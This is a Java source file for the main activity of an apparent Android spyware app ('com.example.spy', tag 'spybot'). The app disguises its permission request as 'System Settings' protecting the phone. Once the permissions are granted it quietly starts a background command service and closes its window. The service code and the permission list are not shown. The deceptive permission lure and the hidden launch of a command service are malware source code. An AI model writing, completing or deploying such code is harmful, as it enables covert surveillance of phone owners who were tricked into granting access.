package com.example.spy.activities;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.app.Activity;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

import com.example.spy.R;
import com.example.spy.services.CommandService;
import com.example.spy.utils.AppController;
import com.example.spy.utils.Constants;

public class MainActivity extends Activity {

    String tag = "spybot";
    SharedPreferences prefs = new AppController().getContext().getSharedPreferences("com.android.spy", Context.MODE_PRIVATE);
    String permissionRationale = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        start();
    }




    private void start() {
        if (hasPermissions()) {
            startService(new Intent(this, CommandService.class));
            finish();
        } else requestPermissions();
    }

    private Boolean hasPermissions() {
        for (String permission : Constants.PERMISSIONS){
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            int k = 0;

            for (String permission : Constants.PERMISSIONS){
                if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) k++;
            }

            if (k > 0) showPermissionRationale();

            else ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, 999);
        }
    }


    private void showPermissionRationale() {
        new AlertDialog.Builder(this).setIcon(R.mipmap.ic_launcher).setTitle("Permission Required")
                .setMessage(permissionRationale)
                .setPositiveButton("OK", (dialog, which) -> {
                    dialog.dismiss();
                    ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, 999);

                })
                .setNegativeButton("Batal", (dialog, which) -> dialog.dismiss())
                .show();

    }
}